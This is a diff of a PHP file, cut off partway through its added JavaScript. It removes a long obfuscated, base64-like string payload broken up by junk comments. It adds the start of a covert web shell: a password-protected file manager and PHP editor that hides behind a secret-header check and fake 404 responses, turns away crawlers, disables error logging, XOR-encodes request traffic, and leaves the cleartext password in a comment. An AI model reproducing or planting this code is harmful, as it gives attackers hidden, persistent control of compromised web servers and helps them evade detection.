-"rudEIzMoq0UJiPFtUp99h2DRAzfsq/7qepsSI2lpC5teqA5r01Kp2rB4gdIg6Z1n7eySibwikdMkhXqyK3YU+H3+4vL2Mb6gB9JCbtm2KUKnxAf2eohjTYsU2XgIRli7zy1wsVe2y2i1kU4y338YKAyKl+eyRcjI36IeHIWWBpfgADniCasyY/4AsZGf6+It4+j9i46egh1g4SC+xysAAx4ABs5y38XisI9rfXHjC2Fyeqe"	//(^@Kksw:KKvdI~<4v%
-.//x%dSc^Y3BAcR/N8UOUuLyYh`cVFk0E,Nbx?ZH
-"73VoDihogi11y/JV/Fz6fes9QI9OKul7Jwn8uFt+lUr/mqpizpCdFO7dQI91ftYKccz6K9ZE+3ipweyKBRcK2ZYMme/6BFwJw6zrafbWs9cIH2QC96yye2XyK5t0+Myino0eJ7zeflWKl1oq3rvqqit9C1XUZSqwxXVyK6maMkI0y2DFrbzr3Poe6Or8kKhMobrIsdBB7+yHKs/X2xGhwgJpy3mX205M6BJree2vwh8nnyp" //o},,Q%3Dg^U
-.#";K.j%|~-o0x~gD1:Me6ZY:s6Z&ESjFup78vu`zj82v*
-"JzR9CldX66e95AmbIiDaUpx8X1mVZ8+Y36zAshr8lyr5uofu18jTB9T34ScHqfb96JgLyC6fs5xH7wcZeDCqeugsiGs5l88wY/xRIC8Ox4c3hGgKFmC9riL8IhjJqdIsMHGg+9rlJorycr+LAL47JnYIq0I2Lk7i5gzzT8yyi25ayY/jCstwC9Lmea5Km9suT37BGbk/+gx24dFhi
-
-d2w27yK2li46J9bwJ9ddkIJphsr7" //oGtHs*EV<@Nk:E?+V-.a
-. 	//oY;W'V/<50-MwJ+}wi2Y+BzBLJcnel]uUU|- vl{?@I9 [s((60
-"dlM2Dca4dKrqK5RaM3wxlX7IJpgGr4cUi97z/d1dIkXU+4yBMeS8PK+FKPMLTy8dIniKZ2Jb2dYq316nc1+Nysng3sQgs0d02g24F1ccBF9iL7YK+TwxSi5ldmyLxuh6rUC3Z/bUsjj7EUd4iU14Y35vKiakBL9grlVirdGmKH/zMlPr4dq3MI2Ho/4en9wJvX92326y6T74WI+MonWgiklnF+KnPC4TKrNXh2IXnS9i92j"/*WEhMY=@<xHL^"{+9!?)0'*/./*Ctn~({]GA$<^f&4K}27T0W*ucQB/ >shAn{h#2HOW[&gD%gzy*/"jAJeE00Qo8GYs+kYMlw6dxH+n51JU7nmmisI2EQo9lg3GaaOn++1YbcrlQdiA+tfZtN7Px4hLBK/xen3ia1Xoo6Mh3JXAC8VQq0PsbzArmdx86MMT9Vgf+y/8dy/p9of2Seq5ebr6Hu/4AgcPJ961JwG04o9TK/l5K/n7iJ857i/Sohk0qE5c5c+1Ki6y34ParlIogqPikXs6vY8+IJq5is/1B16UMc0lSoq11+lrB0OoMk"//>W^Cy{M0Oj|_6f`JRf{GI!=TiE
-.	//(~!?ell686=\{>.o#y(9o;\%j)ZXCazz0(*y03YN#+w
-"12qyn7kI/+HlW2q/UY+FcICTdcYi6jZoId6AIrgCKIPC4n7glKd26nbWikA+1FB2pJyQ/8S14refbE2xaKlzn4hsgkyC8vaeAAs4mM1fiVxKhnZoOUhdfi8pqhJh84gwhi+pXiy23nJ8Z9skrUdTyIGeuwqjyCCGgrhrq/EmdqglahmrciLI8/pIqke90a
-
-B+0aK/yn27Dg+0vZkFdw2o+CgFme41sqKeXep+a3lEU+iBS" 	//EDAccG<|~h5*6fZ9FCap'J(SXo}WQX%k)G.- [21j9G<2gj
-. #U`%0}{;fSutETDGT<;m~%YyskBZv;T^Ct!o.k.4jRpVB/8s
-"7wdkY8HAqk7qmmq1To2PoIJ7SCr0eCqWAb13RYK8TH/UK4kmhlcpgnjer8E1sbnh07K/WU6rgo/FD6C6E3pwIIj2iwdKc32keg8aKp6qgwBHhaqXgf9GVtCspwzRU7Hgf63nDmCohYrK7aToMyiJYBm0aFKYejip0IogWJ5PU+lnUbyQp5we81JSXsjOT98IHjILikWr76I4cK9ref6ngunqeblk0cJRng6EsHo/g76Y+yo"#,!,K'fVFhv}[tVl3
-.	  //O1ewa}Gz0$-ye(oxod.saX0jO+5Ob4?4`SH4'
-"IdcznSUd6Irwvirg7J64UCsm15QhtQvAJoaZ4vadT1dkI7lEB6EKdrB+VKxF3dmgXw03c6nOUq17Hco+NnpjAA1vK96yBq1l5iiRMi81d9s8lSYQq9j6Uq9kxgs4XsnYesrMrkTsgz0/EiIOekabzUpcy3Fe7f95p9az7ueevK2n7U/dA0kMKi2EY+FOx2S33nT5rw7Cq+U7d9JoSfriGilk/t17HIp0BsskvA6hrQT6kUB"//6%W@TyV6.|W5Evo9`G
-./*%9$'PdYLVK[!]~[]#jkv,q?s`~BmJ%\\Yi}r*/"68rrcGs78qItThs+KhFLPS99AIeU6nAf+A22B7jlaq1faiJawpinuJ5R9XQhPn4nYQOgUtpccs/cv7ufztOtTjuj+6xxQlqo7jV51O6HKyRg9DvpPDqy0NZzcW9G4qOuP8dQgpSQ6eceiWR8uQpxObZSSR8mT2bpUqfRiaK64wR
-
-svFAjDFjR6D9wbHLbx0zxv3XW0QU4pv2wDBA31S+A7N8lwb3fc7EJGzzhsTbolGUDQ"#/.^f6FG~ ?m&ag JR,3]4d=
-. #)W2J }K}mK$%m9R&{)wQ/"w#*GxeeiDv%x,j:
-"dgg41s3rKpkOfShgAWAEpcqcrgeDwoEqasj2iLFJ3VRAc5XqbustgvCT4QzDQVnHR1znnR9Ry0bxFJuvo5c4PopgybumjhbhW3PssbfHgFYT4F0wVIA4qnpxVRV+kkLHEQYjPx/GkaDpLiwGkMXqisFDPH8059LvbrLVibx2tWZ0T6EN7kD/uQfNSJiSn20eEwBTu8kTaXYWa+jUZsw5uWWJSmUBHU2HVOG6rM+vbmDVao3"#*9`@9{+N]_Z<FM?KitkHw $
-./*dLDsAu>D?Q_4"x);3Ms*/"zxu9jOwBBsIxN3uOZ3/5t5Uuej0OeghVJVqN5L0StebRphuePZFJtM80RDvXYTLc4t7qTn3vBV0JAEY1xI57RVJ0uqT2m1S8DV17EL533hIgO1Cyss7k/iW2yZx4VmW/ds74VfpQVZajrpHVAFQvL0oWTXObfTuyK+j2DfeNZ4BxUi64gkeOdSE0cQ/gTS5gdzD4euvkQ8QPxEOCUC8DLtSiOM/YTjXDRbulX2lKF+LyOBB"//1;i;./cvn&?\sLgqa.=T=j]fuYTiA\JT*K%5T8
-.	/*|g+oE[>/_Xa0w>cxHA9iN/`cT*/"0uxYCc749NwK/C2KRYk08yxJ5d/zZj8z7ekh2XcMfbiJMy6tM6w9bAvbPp+14MTW0ve+81iN0nttMmpzU2c+8CG9nRvykBHEGwgJffH0ygQUzMuw0sgte4p4im4ukvG4+TmBPV2vYV4BlGBY/CTE8VIM
-
-EqNLTiw6QW81degF0D7gGktVh8PfZFLxBNXfxU1ARGfSKTeEmBpS03Fbz0kJgTBqtfDPAMWg+RqQMACO0loZi"/*c3+5.c$;aT?x*=\PC(_*/.	 	/*A-6H:3 m ds_{wnDARGZCM*bk*/"ZNwWBuBG2w/t41UbksRjbkwPKs2oTZqg8CETk2c1xJ1RoI/0KEuy+fhCjLQvCQPQxm0uO4iVbCJraeFn0UuKWzHRIxnYHCIUW/4O8on60ObuA0lp+g9QXo2wxQNhZlec8IODa7AW9xKZfUVNpTDdF0z4DEmEMJmpqYnlFhoU5tD/ZSXwiZim52xI1KQ8QTAB0ibT0T+rBLZWublKrmeOdzuCcLGMiFTGquLgEn5xRwqg3Tm"/*I+2VM_6zMT35dCvG3ii4?j*/.	/*v&&)!wuIw%8v67;,c59Zn!<!*/"kRMCKNwnyqnj70i9Ia+ANbJ4xHDDCocwnBTYLedSRzyaJfRkevrfxC9P2dtnJxVdl8r3dYI5eDkIMiY/OyRzKUrXPVG8aZN5BA1lcpCzatnL3GjCvpV7Bj27J21PUN5d0GY88O2q4r3SKHFjLMHCLMreO9oq14HXpSOunYGbH8LlQjN4s6aQFR5c4Mg6TTPFIvlZzaAwtXI1teM88kjjJ5EwxKF/QgRPg30sy52FJgWr3ub"#.J[|38P3'mi0K1gFtL`NKA%lVL>yLY*1Yg(` )V*)
-. /*AfQ1:l?W^Y9,g pvf[#Zv+<W5x*/"y1T0+X90FieeeORPI4L9nm5JoWUQVWh0IfRqCS51a94YeFXEPaGX1BDzGOz5GcaSnCOH4oVkvuDOdl9gGEuziMHPkL5atc3HgjlWLmNoxQE6R0waB82RKx8WYnSdLWdC7EuEN
-
-IwnLPCuZL7Fwj+Bt0vwNXWnLgNIE8DxlfHxcVgrcqvwQevLzAiWzXnWrvhgBJeikP/8wXzwYTH7h1R2Mqwgm+Cw1FLQjiFLG+EoME0fy"//r~)Jy 6[wpAr&=|lTsh$!h|ufaP
-.//:Fl{1xc71`/K_7*;` \u(qR%NwPt<9Te]0O1t 
-"GOfcV3FCo6vqevOF3g0EU0fGKv6fNjRmRxEvh+K14gRerMiESOnbmzVccIs3SE9xTOcwQ3Wy/tF8vixvnSHdYDLearjP/op3oTFJof1pjw4EW0Zx0Bh+22rlbydU5q0qwkYcwTDNrdAxriR1P+9vrnCuL8W0yH4alBM80WHtMWY7ZACROgaOqgsGKwy8yhsUxGGBcIfE8dVC4DPH7hBEkuKXBrMUdnQk+Ewy56WGnvwj/7o"/*s8UAU3p]Kki,-o$^XvZl*/.	//`WT)Ps((h0!wi1y12 oa
-"Sw8ycnm3KwF/j/zlPSYOel62OUatkmKbyWV4aPa8s6h1LH3hGDWnsQulnThKwBjR6UjQ3rfbPg4SUVJhN8+P1XR5qQISNgBnj15mupQDqg5jxdQuh8klHXSzsNHeVRFJ3R/WFTDMBPvHWlPyJPVVDtlVqHeT0uIGUmEBwuyzmnIlxrHtOvZdnGESqzVWlf03X0+gZ0SXuTkAJnQOZ1qF4udjKuFzifTEEfZqlVMZ9hb5qjS"	 #QQ%Q)ka9#43ng0|$Oz/RI$U|~oW?oK#
-.# -[.D:arwHE^6PYRZ1q
-"mKJEbMr+TbUDmS7TjFqcrYWD6rtIFfgiDG+ZLE8e+i2jIuJJyxP8BkTxuZhgVLCKgxaFBRy8s4AOIEKHAZNAYdzjHZdd71PIOHq3vcrDp7nLc+L2Pi
-
-1z7ToAY5eD7+Tk0AhUZFLjXJrxmzJA40Ny8obrmJxpg1vYJ+THHv3VuG0TtG0yle8FSiHMLUe6I46QhDa2OevoDP27caJNzQKR4QPxr5PZIeTDYfBIX02jYxySl"//!b'/\|YH=4&aRY`i@omM+qOJCJFSwQsy~u
-.	#I8\"k]^jOW#x1KuE^*@-9JQjS<{D(,/awMK2*
-"sLyglyAARgOnNaDM1KMTQtOjqbH+RKNhMqbt78YOqELGlvO1FC90GY98lCSS10FIQHPAuZrQAaxMmF5aUsMNbM1+GWNWjVPEUuTpnPPVij8mZLUSNVmrfzE3bj5bPOUfT6GEMXSKe+ypGENCxPVvkkE/PV6mc/PZfuV0J0LcjAYNMWXSjnEVXPl+AJx1+ONwDIxY/L5GRn0D0stRmchaya2vis/kmD/9xJFQkrx/cWDbfSD"//VYJQeK*`!IC;=#cWqLK:1uzCR@$e8#Za^f9D1:}AX,\=E;!Z#
-. #IJ|o-=zzCEP@^~sgQ#bgUZ8NKh[S-o!-;LsNR^j+RWD1
-"nMMDT2aIAqHQFzOEk1SxRWbewiSew01u0FK54Yx2TTpCzX+zuD0SFH2ZSWcdb8OAHTz5y2kV2zHdr0HkEsoR6EBIA9VSIUGiDu+PSFwmJPG+I3Xby6xJTKsQW/KMYqQ9DQ/zcRpAxSvDe2j2e2r/7KyV93bk89wM0RqRkvvXrgl2hoVsvRTVPVFPQbdpE+Z6VP0gpTJO7zdNJYPlS/BokBPNKb8z2oH0VYzzPeiWIHmTThL"/* P9'R_5j0=-u%6[QUk[rR1h56?x%,#)B)+4e\t~*/.//:J@o`N5A5yt4FLM4&
-"a8cRBDJH0H98rcHQWYyTiIJjpEsWywxVcCoFlm6c4O8tir/eRfEN3I2kAmYtjZPmVuDozmFl7IFcthQvtIjV/tj8LseMAO0
-
-GvDyYmo9kkSDRnSC3gPOvx777LAVPw877AMVKzSo8OkVNre/MUhYPXlbLw0aFvLzL5Ne96hwMBIrthTcjcivH9zCQtj5JVq6E8LtZOkQsQGrqaFm0A8MIFucQF5xxFXJ91NqZaJxrTVt6j"//{hl;xpET|8\m\9~:N=*)
-.#EP_yR<"oTgLslO"bLM{}w@y`D^QO~ZNZkTQ_o}
-"Z9syS4ikdms0QdLsLZaWsovvQdYXuWiFnSHhDTavUY+V87pLCNVSGmNfV2fZW3CXHzDTxVTLUOzPbwPUq+4w8KQnwr8z9JLoLb2zImPS0m0XFIYpVIPAojlwhK6TTFijg0LX+xTQv8rsya5SrWXLP9LAmiDzuubD5BaWhXd2uBKvaWBT0lEJmUolbv9YrY09g482BWKX3vNEPGvQFGEJQFUnmlPiKE94JLPXtWwHXwyQa2v"//'KMatJSeN}a/F'/!ja[p+MZL8oS^!Tt8a"&+%Q?t>}/uk
-.//U$0P)7*',Fl)#CW)}o}m
-"fB03X7lM51rnFVfAX/Es7qsp6iHPgYHJpbndWWfqECEEAdT9trQfxEIVI8NjPxwQOQdCEgaM/tEffMVWOhFaEJRNNEDT8P68MhTelT2l7YF9Cj9ls1aQvJb8TjbTQu8tcyfJWFobhsXyUO5DxFIZVSWbMAHVQzlC+VgRDzXXAVcswarF/ypeS6YSz/stuZWiFRxyHVRC3aVDEQMT0z63pefuZXHN/3i4O8B6CY1rOPlnFp/"#R2VwD5,AO!WV`?vd'Y\ U+H1s8dvRj1i{DgY(#V}3"omsy~+
-.#>)< t`VFeN5B\rjc)Umz%J!>yz+(]CbPi
-"VkUQbzxDdtW4qv/y1Sh6YyJiZwQLA7NxtPCNT4NOoD6Bjcj82KVIspqHOAbPFI8Nb0+RLWk1PMRd
-
-6RSPfykdvjirvzjnK4zDx15XA5hCSZN6VlD6E9tUq1OLtK2KSyQEwaRAO6qyXxJndrPzwFlRXQolg0X0ROoIvL+lqZt6dZZSAcdd7R04a5A9uSIMQD83Hln1FuShStBwJERM06aZaN8NRbquFQiWwDFQNDrwTY2Ra"/* ,>h$EKdHml~%6*;Wo\][*]#NAEGL|x\g6_ev=x.&g]13*/./*[$w2T`4;7P)3BO>L5t/I#*/"82FmNnnxhtUxjyVmHsYE+QRbbm63l9OsJMUzN+rtdzbRnfnqlu3G2O9K76sZj06X0rLSt5S7jpCDSoSYnRhjSbZNr9EXF7Nt53NQQ69xc0VpOXz9wYHBDlubTkzrJjRJUKM525rqgnl5yAZFyV9yft5pfeDUg0PCG0xkU5AXfZpTsv35CEIsZQg1ibM3fOluaqaTFKdX74nxVlIonZ1O+FTCbuXeS1KTE8JpEmMLnst+Jhq"#/n3~7'bw3[#5Groy^-}TIp4K!u]lfn+,M8
-.//`Lm$z'xx\sFV'Sm&JkRet`W/t#7*"kzk
-"z1JVRR05OWX7rpbsBLjW17uY3eOBMDQh/OXFnERuz00IQ0EcomwSr4l64wtKqRhW9pZx6yuUhe3Pvewi+h8fgbzQ4+Y41QEEPpUMjle6vll7vVEXSUJkkITZyh0LN0nOL4VAFDNKktD0waBnDVxyaJoNjRkDaFWuCDjVHZaiSPSF4aSuaI59AKIMl00bk1wUAOY08Q6RAfjkTf+qQbT/bbiRZ8P+7Ym2SUxM/iTV4B1SJ8L"//4ohK G)wlEQIJh~.PJ.I%&{ W9L_A_;Fs5qg
-. #/6W~|$%=5b.0/Q&8NsCG
-"DKHuoWii+PfwfIJHDlEajXD6ivmQ0iLuXMpZYNIR/28WQRuPW+n5wSQYv
-
-i/6N0KjBnijbttTNHFVINUVNdy+b19W08YD71L8ajZgjzLepEnfuGYH/QxLLpadvEjECtBuW7udOW8W634icS+QiNWAN5dgv2TsWZLzL7vbl9FD3t+fTP9sJtbzex0NHNvFFNxDNdAl/qZ7+06zzdjXDqCtjvJ2BBpabkrVqyTxyizIN4Obg"/*;mnc0PSW$FxH!`{uQJk7eg'\GsNcv&K60Cx$%%bM1**/.//Q_/-}%$oX$LvDHr@F-W*}'@nK"xK15,jH U@3~nX
-"83UuhWhPoXG6LG/FKCkxmKgVulN0LVkl2dYpJ7c7MtkLVmd8qBi0UJnKIfqeNgQPnhJSHxO1ZImj6zi0tNpUdeTbexDl7w1v+5EgFAZqZTnaTwrL0hEkqnoVg+8YDLMFLHRDqe8uF5p4dONdP67BNMKPSHGIF7L3b24LEVFLxfDMdvzdVsg0Rg5UrkbLNvFCbHzcD0XuCOnOPYvZzlR1mAMDJY5undkDxjVmMciEUDiOONR" /*r<BBvwWqXouPnnAn9[ztitqM*/. //1nCDLju!]vSl~$
-"jrjVLFoPRGBXqs+cb6fTOx8MtLt+WAo62CczOFdI2ymP2kRfNedXSAsI1xPZCKHdSRHSQ9Ok1OyjJ18nH3pzr6Ke4DGFGsUZuPnbM0rOd78mx0QFaTg1pQyvnFd8lrC4h7LztTbHTsYgqfy72ogh2Xdiq2SdagCqFfSqHGsY/f09U7eU6ZD/CxLo6D5taoROGiiSpxh8GaG85HJad6vJGnwcDAKUxPMT9ENgjhcfuGTRWkP"//em@t.WIB't)Ue<32=D(Lx!.W6BGR6S/8|pjnp
-. 	//h\=k+[/_9O;v6
-"105sCgGxC84sv6JND4grsDTB4AD5X9Uc1kKwqI
-
-IV0dmnIS7QzAva0sNN+ZXaNGNbeCD4/CS7eOq2FkFZKQ8LOzdh84EWIBUhisUHihoscSWUXMuhoiyVrQ40ECZPSA0o4lsEVOVENmB1iIgrbQokQ2ZU8NHHaVuhB1xESjbDD3hs3G1HbSFpMXuy2HPq4ovdL1Qp0Z72aRuArzpGo8jnYnuB8NRxO+172LTS9IPr5qYvm"//-HmHl/W$?gF3ZHpJr#+Nd(9FrvKg&GWIqsN#+ECb
-./*+=B~K~7Q3U#ZF6"U,3\7&nW"\#cHt;{} &j*/"WoFVfuxPjoMMVV7iovRhbWd8Tdn9LAf+LL0SX/QPAPOi8w19GO4d59Q1DX4lYpUXho256Jh7qLXHeTN/ouGBuvNc+aNyT4T6DnvsUaDx+2xkE4Eok2Ru49q4WD7HDWNGlY0LfCnxXpRp5+E4bw9eY6VHPFNicTBVpZtgCt41I2BV/PE7RjGhgIRSMRnxaBXJzy7v75axl9i7hMrVDXwcswj2345JH25qVraNngZBQLFoRUT"//`O2:SY)v5d?.b_OK:tF@PrnSpt!"YG_8!?`(c<=@"l
-.	/*TO>{8L>slzjFz~F+mujY q7b\Zb!qNuZsL]*CtXKoF"?Avf*/"RoE7t0YeRNBbOBCyJH4zOyPO7C/Qbs+6qPs1pXAyPSpa0cPgG11KcZoWHAjpuXGL0NP3/Gmu1l1wlRtBNRNySb9rZSWjxVF/OwYudtDebPGOYb02qLjkCiC0ikBJeTunuDF7kSy4Gw4nhxZSdunOJgKbHTLx1s1YDLgkipNtUJGEvS4fw7WEkAKgR87ekv4cn5ab8AO7nPvdXj3W8c9fjAet8GLb9jo8Xf3QO95xIqpwyod"/*P!DY*^sYBEjxTv7+&EEt8D*P|t0=j-p%*/. /*7|PIeR&}`z.c4iP0N<IrT*|m$%hT|M@GF*/"rVdOW0NAZPB/+ljdwxU
-
-goHtUIbgUNjbS1mPEcGNs5PCnyYnaBziVtuX9UH2uWDSq3A2HEDYhtjtajrl9yjiiOZ0KRXUTghMys+MXKm3jYKnFhr9dgn7HqCbuIJ+ocLMwEh1KSDN0LGAXvEW8LltsZcqvl/CssZhG0SI220LvY+GIUouCt8e5BD8kt14XeEHrYYXb3wRJuzdOJZTyTL105wgtl2RigZ+vtiFI9BcfF10IM"//[neU>Tkam$]l6nB!F7]FD`._a
-.	//dc=~KG?PX]x)0=g4~u"xaX
-"PNN/mBMwX3zzFiZsfjWe5gzjI5IXMJm1Tdr4yrryrMQi+VyjNx7pnp0/jVmfUg3kPi9zoxfre35atkmCLjHTl3R1nnywBvhMWdc7H71EwBTdZV+Wm0ys4JDbSr4+p3STODWGw0LDJa4iidJ7PJunTfwVIcX8ryecSsw206znDyE7KZTKb2hhPTYQNOe4L1fXyXd/KiclF5wtqIhhrF5Yp/yeHMpMeeDOaewYKmasGxbjSfk"#N<5kyDXE{t;Jq}[
-./*&HmO#{Qgba@I<:%95h'`FiF8<[Rb7BuC1Q%;5\vNh*v*/"YKmK5dNEdjRzIb6SNa7i4vJFiCAO1IuiMuKdhrLzK4uV6qn4pygxPr4uE/sEqVja8i+QK/YaBs587o/fleF9pIEM7sy1GeKsg5038uHshhQAbhs+8qmx+9xeh+ze+1dCzdm4dy//+q5qt5G/M5cJq+HcFg6lcBFJy51+kBm2wqWlE6yGyn/i+aUSUtWWbNVDL4602YgRRNrbvDioiTiRDRLZgBAUl78aG/98ww9VW+K71Y7"#(Hf-fD0B{bNRucdE%Vl6| 4A'"AB8r?d@f\UUy^}fa]71^jO
-)/*|e5wGN0$=vv{}IhHq*/)//{g/NEQ40n!l}v'W|HxY\[LvqhKa9zJx+h.
-)//hHgeK_xi;lB=b/}Q.k52AAjH;}q}h4YDUkMZG
-)/*+`)|EM:^h9,*/)/*nDLr {wZU;66oz\6W-S#>vQ}=%zT.0p`*/;//y}'kZ9tvjRBuK\XA!uB{d0&M^%W1dd<L5
+<?php
+$GLOBALS['HASHTYPE'] = 'sha512';
+$GLOBALS['PASSHASH'] = 'dfbbeccfdcae9732e3d43697861efbe7bc56ffc746f07c3176a4594fc09977b747997d93cb65fb64ff093bc467e0ab35de3bc761efa29cb29a95c4df38375c26';//P@55w()rD
+$GLOBALS['SECHEAD'] = 'USER_AGENT';
+$GLOBALS['DEFAULT_TAB'] = 'tabFM';
+$GLOBALS['COOKIE'] = false;
+$GLOBALS['DARK'] = false;
+$GLOBALS['REMOTE_ADDR'] = true;
+$GLOBALS['ACECONF'] = array('DEFAULT' => true, 'THEME' => 'crimson_editor', 'MODE' => 'php', 'URL' => 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.14.0/ace.js');
+$GLOBALS['DEBUG'] = (isset($GLOBALS['DEBUG']) ? $GLOBALS['DEBUG'] : false);
+
+filterClient();
+decodeRequest();
+checkAuth();
+
+function checkAuth(){
+	if(!$GLOBALS['PASSHASH']) return setEncKey();
+
+	$loginWithPass = (isset($_REQUEST['pass']) && hash($GLOBALS['HASHTYPE'], $_REQUEST['pass']) === $GLOBALS['PASSHASH']);
+	$encKeyWithPass = ($GLOBALS['ENCKEY'] === genEncKey($GLOBALS['PASSHASH']));
+
+	if($loginWithPass)
+		setEncKey($GLOBALS['PASSHASH']);
+	elseif($encKeyWithPass)
+		setEncKey();
+	else
+		loginFormOut();
+}
+
+function getEncKey(){
+	$len = $GLOBALS['PRELEN'];
+	
+	foreach($_REQUEST as $k => &$v){
+		$pref = strrev(substr($k, 0, $len));#tabFM
+		$post = substr($k, $len, $len);
+		if($pref === $post){
+			$eKey = $v;
+			unset($_REQUEST[$k]);
+			$GLOBALS['ENCKEY'] = base64_decode($eKey);
+			return $GLOBALS['ENCKEY'];
+		}
+	}
+	
+	return false;
+}
+
+function genEncKey($str){
+	return base64_encode(hash($GLOBALS['HASHTYPE'], ($GLOBALS['REMOTE_ADDR'] ? $_SERVER['REMOTE_ADDR'] : '').$str.__FILE__));
+}
+
+function setEncKey($pass = ''){
+	if(!$pass && $GLOBALS['ENCKEY']) return $GLOBALS['ENCKEY'];
+	$eKey = genEncKey($pass);
+	$GLOBALS['ENCKEY'] = $eKey;
+	return $eKey;
+}
+
+function mergeRequestVars(){
+	$vars = array('_FILES','_COOKIE','_REQUEST');
+	foreach($vars as $var)
+		if(isset($GLOBALS[$var]))
+			foreach($GLOBALS[$var] as $k => &$v)
+				$_REQUEST[$k] = &$GLOBALS[$var][$k];
+}
+
+function decodeRequest(){
+	mergeRequestVars();
+	$GLOBALS['PRELEN'] = getPreLen();
+	if(!$GLOBALS['ENCKEY'] = getEncKey()) $GLOBALS['ENCKEY'] = setEncKey();
+	$_REQUEST = decodeInput($_REQUEST);
+}
+
+function getPreLen(){
+	return (substr(array_sum(str_split(hash($GLOBALS['HASHTYPE'], __FILE__))), -1) + 5);
+}
+
+function filterClient(){
+	$secretHeader = isset($_SERVER['HTTP_'.$GLOBALS['SECHEAD']]);
+	$crawlerBot = preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT']);
+	if($crawlerBot || !$secretHeader) exit(header('HTTP/1.1 404 Not Found'));
+}
+
+function loginFormOut(){
+	$html = '<html><head><meta name="robots" content="noindex"></head><body style="background:#f0f0f0;display:grid;height:100vh;margin:0;place-items:center center;"><form action="" method="POST" onsubmit="return login(this)"><input style="text-align: center" name="pass" type="password" value=""></form></body>'.paramsHandlerJS().'</html>';
+	exit(makeOut($html));
+}
+
+function scriptInit(){
+	if(!isset($GLOBALS['DEBUG'])) return;
+	define('D', $GLOBALS['DEBUG']);
+	set_time_limit(D ? 15 : 0);
+	error_reporting(D ? E_ALL : 0);
+	ini_set('display_errors', D ? 'On' : 'Off');
+	ini_set('max_execution_time', D ? 15 : 0);
+	ini_set('error_log', NULL);
+	ini_set('log_errors', 0);
+}
+
+function decodeInput(&$arr){
+	$str = '';
+	foreach($arr as $k => $v){
+		$key = getName($k);
+		if(!strlen($key)) continue;
+		$str .= $key.'='.urlencode(getValue($v)).'&';
+		unset($arr[$k]);
+	}
+	parse_str($str, $dec);
+	return array_merge($arr, $dec);
+}
+
+function xorStr($str, $decode = false) {
+	$key = $GLOBALS['ENCKEY'];
+    $key_len = strlen($key);
+    $str = (!$decode ? rawurlencode($str) : $str);
+    for($i = 0; $i < strlen($str); $i++)
+        $str[$i] = $str[$i] ^ $key[$i % $key_len];
+    $str = ($decode ? rawurldecode($str) : $str);
+    return $str;
+}
+
+function ascii2hex($ascii) {
+	$hex = '';
+	for ($i = 0; $i < strlen($ascii); $i++) {
+		$byte = strtoupper(dechex(ord($ascii[$i])));
+		$byte = str_repeat('0', 2 - strlen($byte)).$byte;
+		$hex.=$byte;
+	}
+	return $hex;
+}
+
+function hex2ascii($hex){
+	$ascii='';
+	$hex=str_replace(" ", "", $hex);
+	for($i=0; $i<strlen($hex); $i=$i+2)
+		$ascii.=chr(hexdec(substr($hex, $i, 2)));
+	return($ascii);
+}
+
+function setName($str){
+	$str = ascii2hex(xorStr($str));
+	$pref = substr($GLOBALS['ENCKEY'], 0, $GLOBALS['PRELEN']);
+	return $pref.$str;
+}
+
+function getName($str){
+	$data = getData($str);
+	if($data === false) return false;
+	return xorStr(hex2ascii($data), true);
+}
+
+function setValue($str){
+	return base64_encode(xorStr($str));
+}
+
+function getValue($str){
+	return xorStr(base64_decode($str), true);
+}
+
+function getData($str){
+	$ln = $GLOBALS['PRELEN'];
+	$pref = substr($str, 0, $ln);
+	$data = substr($str, $ln);
+	return ($pref === substr($GLOBALS['ENCKEY'], 0, $ln) ? $data : false);
+}
+
+function paramsHandlerJS(){
+	return '<script>
+		var ENCKEY = atob("'.base64_encode($GLOBALS['ENCKEY']).'");
+		var PRELEN = '.$GLOBALS['PRELEN'].';
+		var COOKIE = '.(int)$GLOBALS['COOKIE'].';
+
+		'.($GLOBALS['DARK'] ? 'invertColors();' : '').'
+		startEventsListners();
+		if(COOKIE){
+			if(ci = document.getElementById("cbCO"))
+				ci.checked = "on";
+			deleteAllCookies();
+		}
+
+		function startEventsListners(){
+			var elements = document.getElementsByTagName("*");
+		
+			for(var i=0;i<elements.length;i++){
+
+				if(elements[i].type && elements[i].type == "file")
+						elements[i].onchange = function(e){
+							if(!elmById("cbRR").checked) prepareFile(this)
+							else uplFiles();
+						}
+					
+			}
+		}
+				
+		function bin2hex(bin){
+		  var hex = "";
+		  for(var i = 0; i<bin.length; i++){
+		    var c = bin.charCodeAt(i);
+		    if (c>0xFF) c -= 0x350;
+		    hex += (c.toString(16).length === 1 ? "0" : "") + c.toString(16);
+		  }
+		  return hex;
+		}
+		
+		function login(form){
+			addEncKey(form);
+			form.pass.value = setValue(form.pass.value);
+			form.pass.name = setName(form.pass.name);
+			
+			if(COOKIE)
+				submitViaCookie(form);
+			else
+				return true;
+				
+			return false;
+		}
+		  
+		function hex2bin(hex) {
+		  var bin = "";
+		  for (var i=0; i<hex.length; i=i+2) {
+		    var c = parseInt(""+hex[i]+hex[i+1], 16);
+		    if (c>0x7F) c += 0x350;
+		    bin += String.fromCharCode(c);
+		  }
+		  return bin;
+		}
+			
+		function xorStr(str, decode = false) {
+			str = (!decode ? encodeURIComponent(str) : str);
+			str = str.split("");
+		    key = ENCKEY.split("");
+		    var str_len = str.length;
+		    var key_len = key.length;
+		
+		    var String_fromCharCode = String.fromCharCode;
+		
+		    for(var i = 0; i < str_len; i++) {
+		        str[i] = String_fromCharCode(str[i].charCodeAt(0) ^ key[i % key_len].charCodeAt(0));
+		    }
+		    str = str.join("");
+		    
+		    if(decode){ 
+				try{
+					str = decodeURIComponent(str);
+				}
+				catch(e){
+					str = unescape(str);
+				}
+			}
+
+		    return str;
+		}
+		
+		function setName(str){
+			str = bin2hex(xorStr(str));
+			pref = ENCKEY.substr(0, PRELEN);
+			return pref + str;
+		}
+		
+		function setValue(str){
+			return btoa(xorStr(str));
+		}
+		
+		function getValue(str){
+			return xorStr(atob(str), true);
+		}
+		
+		function addEncKey(form){
+			var encKey = document.createElement("input");
+			encKey.type = "hidden";
+			pref = ENCKEY.substr(0, PRELEN);
+			encKey.name = pref.split("").reverse().join("") + pref;
+			encKey.value = btoa(ENCKEY);
+			form.appendChild(encKey);
+			return form;
+		}
+		
+		function fixFileName(str, len = false){
+			str = str.split(/(\\\\|\\/)/g).pop();
+			if(len) str = str.substring(0, len);
+			return str;
+		}
+		
+		function getParentFormOf(element){
+			
+			while(element.tagName != "FORM")
+				element = element.parentElement;
+
+			return element;
+		}
+		
+		function prepareFile(input){
+			var file = input;
+			form = getParentFormOf(input);
+			form.enctype = "application/x-www-form-urlencoded";
